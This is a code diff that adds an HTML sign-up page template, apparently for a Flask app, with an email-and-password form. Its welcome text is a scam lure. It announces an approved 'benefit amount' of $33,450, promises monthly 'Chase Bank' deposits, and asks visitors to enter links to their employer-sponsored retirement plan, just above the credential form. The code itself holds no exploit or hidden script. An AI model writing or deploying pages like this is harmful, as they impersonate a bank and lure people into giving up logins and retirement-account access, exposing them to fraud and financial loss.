@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign Up</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+
+<div class="container">
+
+    <h2>Welcome!</h2>
+
+<p>
+Benefit Amount Approved: $33,450.00
+
+Compulsory Details to enable Chase Bank Deposit a 5% of your Total Benefits every month
+$33,450 by 0.05 = $1,672.50
+
+Kindly Enter The Link With Your Employer-Sponsored Retirement Plan.
+
+
+</p>
+
+<hr>
+
+<h3>Sign Up</h3>
+
+<form method="POST">
+
+<input type="email"
+       name="email"
+       placeholder="Email"
+       required>
+
+<input type="password"
+       name="password"
+       placeholder="Password"
+       required>
+
+<button type="submit">
+
+Create Account
+
+</button>
+
+</form>
+
+<p>
+
+Already have an account?
+
+<a href="/login">
+
+Login
+
+</a>
+
+</p>
+</div>
+
+</body>
+</html>
